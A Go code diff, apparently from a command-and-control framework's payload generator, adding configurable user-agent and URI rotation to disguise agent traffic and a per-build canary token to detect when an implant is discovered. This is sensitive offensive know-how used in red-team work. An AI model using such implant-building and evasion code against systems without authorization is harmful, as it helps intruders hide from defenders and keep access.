@@ -1,7 +1,9 @@
 package services
 
 import (
+	"crypto/rand"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"os"
@@ -46,6 +48,9 @@ type PayloadConfig struct {
 	Sleep      int    `json:"sleep"`       // milliseconds
 	Jitter     int    `json:"jitter"`      // percentage 0-100
 	OutputPath string `json:"output_path"` // where to save the binary
+	// TrafficProfile, when set, bakes UA rotation / URI alternation into the
+	// agent (Malleable-profile lite). Optional.
+	TrafficProfile *TrafficProfileCfg `json:"traffic_profile,omitempty"`
 }
 
 // AgentConfig is the JSON injected into the agent.
@@ -60,6 +65,18 @@ type AgentConfig struct {
 	Jitter            int    `json:"jitter"`
 	KillDate          int64  `json:"kill_date"`
 	RSAPublicKey      string `json:"rsa_public_key"`
+	CanaryToken       string `json:"canary_token,omitempty"`
+	TrafficProfile    *TrafficProfileCfg `json:"traffic_profile,omitempty"`
+}
+
+// TrafficProfileCfg is the operator-facing traffic shaping config baked into
+// the agent (Malleable-profile lite).
+type TrafficProfileCfg struct {
+	UserAgents []string `json:"user_agents,omitempty"`
+	URIs       []string `json:"uris,omitempty"`
+	RegisterURI string `json:"register_uri,omitempty"`
+	CheckinURI  string `json:"checkin_uri,omitempty"`
+	PubKeyURI   string `json:"pubkey_uri,omitempty"`
 }
 
 // Generate builds an agent binary with the given configuration.
@@ -116,7 +133,26 @@ func (ps *PayloadService) makeAgentConfig(config PayloadConfig, listener *db.Lis
 		Jitter:            config.Jitter,
 		KillDate:          0,
 		RSAPublicKey:      ps.serverSvc.GetRSAPublicKey(),
+		CanaryToken:       ps.issueCanary("agent-" + listener.Name),
+		TrafficProfile:    mergeTrafficProfile(listener, config.TrafficProfile),
 	}
+}
+
+// issueCanary creates a unique per-build burn-detection token and registers it
+// in the database. Returns "" on failure (best-effort).
+func (ps *PayloadService) issueCanary(buildName string) string {
+	if ps.serverSvc == nil || ps.serverSvc.GetServer() == nil || ps.serverSvc.GetDB() == nil {
+		return ""
+	}
+	tb := make([]byte, 12)
+	if _, err := rand.Read(tb); err != nil {
+		return ""
+	}
+	token := hex.EncodeToString(tb)
+	if err := ps.serverSvc.GetServer().IssueCanary(token, buildName); err != nil {
+		return ""
+	}
+	return token
 }
 
 // templateDirOverride lets tests point template payload generation at a
